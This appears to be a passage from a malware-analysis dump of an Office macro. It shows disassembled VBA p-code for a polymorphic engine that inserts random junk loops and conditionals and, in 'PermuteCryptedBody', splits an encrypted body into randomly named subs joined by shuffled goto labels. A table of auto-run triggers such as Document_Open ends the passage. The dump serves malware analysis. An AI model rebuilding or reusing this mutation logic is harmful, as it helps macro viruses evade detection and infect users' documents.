' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #206:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #207:
' 	Ld fc 
' 	LitStr 0x0004 "loop"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #208:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #209:
' 	ArgsLd getname 0x0000 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St s 
' Line #210:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #211:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #212:
' 	Ld fc 
' 	LitStr 0x0003 "do "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #213:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #214:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "+"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #215:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #216:
' 	Ld fc 
' 	LitStr 0x000B "loop until "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 ">"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0029 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #217:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #218:
' 	ArgsLd getname 0x0000 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St s 
' Line #219:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #220:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #221:
' 	Ld fc 
' 	LitStr 0x0003 "do "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #222:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #223:
' 	Ld fc 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "+"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #224:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #225:
' 	Ld fc 
' 	LitStr 0x000B "loop while "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld s 
' 	Add 
' 	LitStr 0x0001 "<"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000B 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #226:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #227:
' 	Ld fc 
' 	LitStr 0x0004 "for "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0004 " to "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000B 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0006 " step "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #228:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #229:
' 	Ld fc 
' 	LitStr 0x0004 "next"
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #230:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #231:
' 	LitDI2 0x0002 
' 	St tfc 
' Line #232:
' 	Ld fc 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	LitStr 0x0001 "="
' 	Add 
' 	St fc 
' Line #233:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St fc 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St tfc 
' 	Else 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	St fc 
' 	EndIf 
' Line #234:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	Ld tfc 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	LitStr 0x0001 "+"
' 	Add 
' 	St fc 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St tfc 
' 	EndIf 
' Line #235:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	Ld tfc 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	LitStr 0x0001 "-"
' 	Add 
' 	St fc 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St tfc 
' 	EndIf 
' Line #236:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	Ld tfc 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	LitStr 0x0001 "*"
' 	Add 
' 	St fc 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St tfc 
' 	EndIf 
' Line #237:
' 	Ld tfc 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #238:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St fc 
' 	Else 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	St fc 
' 	EndIf 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	Ld fc 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #241:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #242:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #243:
' 	Ld fc 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0003 "if "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St fc 
' Line #244:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #245:
' 	LitStr 0x0001 "<"
' 	St tfc 
' Line #246:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	ElseIfBlock 
' Line #247:
' 	LitStr 0x0001 ">"
' 	St tfc 
' Line #248:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	ElseIfBlock 
' Line #249:
' 	LitStr 0x0001 "="
' 	St tfc 
' Line #250:
' 	ElseBlock 
' Line #251:
' 	LitStr 0x0000 ""
' 	St tfc 
' Line #252:
' 	EndIfBlock 
' Line #253:
' 	Do 
' Line #254:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #255:
' 	LitStr 0x0001 "<"
' 	St tfc1 
' Line #256:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	ElseIfBlock 
' Line #257:
' 	LitStr 0x0001 ">"
' 	St tfc1 
' Line #258:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	ElseIfBlock 
' Line #259:
' 	LitStr 0x0001 "="
' 	St tfc1 
' Line #260:
' 	ElseBlock 
' Line #261:
' 	LitStr 0x0000 ""
' 	St tfc1 
' Line #262:
' 	EndIfBlock 
' Line #263:
' 	Ld tfc 
' 	Ld tfc1 
' 	Eq 
' 	LoopWhile 
' Line #264:
' 	Ld fc 
' 	Ld tfc 
' 	Add 
' 	Ld tfc1 
' 	Add 
' 	St fc 
' Line #265:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #266:
' 	Ld fc 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	St fc 
' Line #267:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	ElseIfBlock 
' Line #268:
' 	Ld fc 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	St fc 
' Line #269:
' 	ElseBlock 
' Line #270:
' 	Ld fc 
' 	LitStr 0x0004 "rnd*"
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	St fc 
' Line #271:
' 	EndIfBlock 
' Line #272:
' 	Ld fc 
' 	LitStr 0x0006 " then "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St fc 
' Line #273:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' 	BoS 0x0000 
' 	Ld m 
' 	Ld maxm 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld fc 
' 	Ld m 
' 	ArgsCall (Call) polym 0x0002 
' 	EndIf 
' Line #274:
' 	Ld fc 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0006 "end if"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	St fc 
' Line #275:
' 	CaseElse 
' Line #276:
' 	EndSelect 
' Line #277:
' 	EndSub 
' Line #278:
' 	FuncDefn (Private Sub PermuteCryptedBody(CryptedS, myVars, ProceduresCounter))
' Line #279:
' 	LitDI2 0x0000 
' 	St LinesCounter 
' Line #280:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CryptedS 
' 	FnLen 
' 	For 
' Line #281:
' 	Ld CryptedS 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	St LinesCounter 
' 	EndIf 
' Line #282:
' 	StartForVariable 
' 	Next 
' Line #283:
' 	OptionBase 
' 	Ld LinesCounter 
' 	LitDI2 0x0002 
' 	Add 
' 	Redim CSLines 0x0001 (As Variant)
' Line #284:
' 	OptionBase 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	Redim TableCounter 0x0001 (As Variant)
' Line #285:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn CorrectTable
' Line #286:
' 	LitDI2 0x0001 
' 	St i1 
' Line #287:
' 	ArgsLd getname 0x0000 
' 	LitStr 0x0001 "0"
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld LinesCounter 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsSt CSLines 0x0001 
' Line #288:
' 	Ld LinesCounter 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsLd CSLines 0x0001 
' 	St lastgoto 
' Line #289:
' 	LitDI2 0x0001 
' 	St t 
' Line #290:
' 	LitStr 0x0000 ""
' 	St ProceduresCounter 
' Line #291:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LinesCounter 
' 	For 
' Line #292:
' 	LitDI2 0x0000 
' 	St ProcedureFlag 
' Line #293:
' 	LitStr 0x0000 ""
' 	St fc 
' 	BoS 0x0000 
' 	Ld fc 
' 	LitDI2 0x0001 
' 	ArgsCall (Call) polym 0x0002 
' Line #294:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld lastgoto 
' 	Add 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld fc 
' 	Add 
' 	St fc 
' Line #295:
' 	Ld CryptedS 
' 	Ld i1 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Ne 
' 	DoWhile 
' Line #296:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	Ld CryptedS 
' 	Ld i1 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #297:
' 	Ld i1 
' 	LitDI2 0x0001 
' 	Add 
' 	St i1 
' Line #298:
' 	Loop 
' Line #299:
' 	LitStr 0x0000 ""
' 	St fls 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St iflag 
' Line #300:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Gt 
' 	IfBlock 
' Line #301:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "I"
' 	Eq 
' 	IfBlock 
' Line #302:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St fls 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St iflag 
' Line #303:
' 	LitDI2 0x0001 
' 	St ProcedureFlag 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	EndIfBlock 
' Line #306:
' 	LitStr 0x0000 ""
' 	St CSL 
' Line #307:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	FnLen 
' 	For 
' Line #308:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St CSL1 
' Line #309:
' 	Ld CSL1 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	IfBlock 
' Line #310:
' 	Ld i 
' 	Ld t 
' 	ArgsSt CorrectTable 0x0001 
' 	BoS 0x0000 
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #311:
' 	LitDI2 0x0001 
' 	St ProcedureFlag 
' Line #312:
' 	LitStr 0x0001 " "
' 	St CSL1 
' Line #313:
' 	EndIfBlock 
' Line #314:
' 	Ld CSL1 
' 	LitStr 0x0001 "^"
' 	Eq 
' 	IfBlock 
' Line #315:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CSL1 
' Line #316:
' 	LitDI2 0x0001 
' 	St ProcedureFlag 
' Line #317:
' 	EndIfBlock 
' Line #318:
' 	Ld CSL 
' 	Ld CSL1 
' 	Add 
' 	St CSL 
' Line #319:
' 	StartForVariable 
' 	Next 
' Line #320:
' 	Ld CSL 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #321:
' 	Ld ProcedureFlag 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #322:
' 	ArgsLd getname 0x0000 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	ArgsLd getname 0x0000 
' 	Add 
' 	Ld myVars 
' 	Add 
' 	St callto 
' Line #323:
' 	LitStr 0x0000 ""
' 	St fc2 
' 	BoS 0x0000 
' 	Ld fc2 
' 	LitDI2 0x0001 
' 	ArgsCall (Call) polym 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St fc1 
' 	BoS 0x0000 
' 	Ld fc1 
' 	LitDI2 0x0001 
' 	ArgsCall (Call) polym 0x0002 
' Line #324:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #325:
' 	Ld ProceduresCounter 
' 	LitStr 0x000C "private sub "
' 	ArgsLd ref 0x0001 
' 	Add 
' 	Ld callto 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld fc 
' 	Add 
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	Ld fc1 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0007 "end sub"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St ProceduresCounter 
' Line #326:
' 	ElseBlock 
' Line #327:
' 	LitStr 0x000C "private sub "
' 	ArgsLd ref 0x0001 
' 	Ld callto 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld fc 
' 	Add 
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	Add 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	Ld fc1 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0007 "end sub"
' 	ArgsLd ref 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld ProceduresCounter 
' 	Add 
' 	St ProceduresCounter 
' Line #328:
' 	EndIfBlock 
' Line #329:
' 	Ld fc 
' 	Ld fls 
' 	Add 
' 	LitStr 0x0005 "call "
' 	Add 
' 	Ld callto 
' 	Add 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #330:
' 	ElseBlock 
' Line #331:
' 	Ld fc 
' 	Ld fls 
' 	Add 
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #332:
' 	EndIfBlock 
' Line #333:
' Line #334:
' 	LitStr 0x0000 ""
' 	St fc 
' 	BoS 0x0000 
' 	Ld fc 
' 	LitDI2 0x0001 
' 	ArgsCall (Call) polym 0x0002 
' Line #335:
' 	Ld iflag 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #336:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #337:
' 	ElseBlock 
' Line #338:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	ArgsLd refn 0x0000 
' 	Add 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #339:
' 	EndIfBlock 
' Line #340:
' 	ArgsLd getname 0x0000 
' 	LitStr 0x0001 "0"
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St lastgoto 
' Line #341:
' 	Ld i 
' 	ArgsLd CSLines 0x0001 
' 	Ld fc 
' 	Add 
' 	LitStr 0x0005 "goto "
' 	Add 
' 	Ld lastgoto 
' 	Add 
' 	Ld i 
' 	ArgsSt CSLines 0x0001 
' Line #342:
' 	Ld i 
' 	Ld i 
' 	ArgsSt TableCounter 0x0001 
' Line #343:
' 	Ld i1 
' 	LitDI2 0x0002 
' 	Add 
' 	St i1 
' Line #344:
' 	StartForVariable 
' 	Next 
' Line #345:
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsSt TableCounter 0x0001 
' Line #346:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld lastgoto 
' 	Add 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsSt CSLines 0x0001 
' Line #347:
' Line #348:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LinesCounter 
' 	For 
' Line #349:
' 	Ld Rnd 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #350:
' 	Ld k 
' 	ArgsLd TableCounter 0x0001 
' 	St k1 
' Line #351:
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i 
' 	Sub 
' 	ArgsLd TableCounter 0x0001 
' 	Ld k 
' 	ArgsSt TableCounter 0x0001 
' Line #352:
' 	Ld k1 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i 
' 	Sub 
' 	ArgsSt TableCounter 0x0001 
' Line #353:
' 	StartForVariable 
' 	Next 
' Line #354:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LinesCounter 
' 	For 
' Line #355:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #356:
' 	Ld i 
' 	ArgsLd TableCounter 0x0001 
' 	Ld t 
' 	ArgsLd CorrectTable 0x0001 
' 	Eq 
' 	IfBlock 
' Line #357:
' 	Ld i 
' 	ArgsLd TableCounter 0x0001 
' 	St k1 
' Line #358:
' 	Ld t 
' 	ArgsLd CorrectTable 0x0001 
' 	ArgsLd TableCounter 0x0001 
' 	Ld i 
' 	ArgsSt TableCounter 0x0001 
' Line #359:
' 	Ld k1 
' 	Ld t 
' 	ArgsLd CorrectTable 0x0001 
' 	ArgsSt TableCounter 0x0001 
' Line #360:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld t 
' 	ArgsSt CorrectTable 0x0001 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	StartForVariable 
' 	Next 
' Line #363:
' 	StartForVariable 
' 	Next 
' Line #364:
' Line #365:
' 	LitStr 0x0000 ""
' 	St CryptedS 
' Line #366:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LinesCounter 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #367:
' 	Ld CryptedS 
' 	Ld i 
' 	ArgsLd TableCounter 0x0001 
' 	ArgsLd CSLines 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #368:
' 	StartForVariable 
' 	Next 
' Line #369:
' 	LitStr 0x0005 "goto "
' 	Ld LinesCounter 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsLd CSLines 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld CryptedS 
' 	Add 
' 	St CryptedS 
' Line #370:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
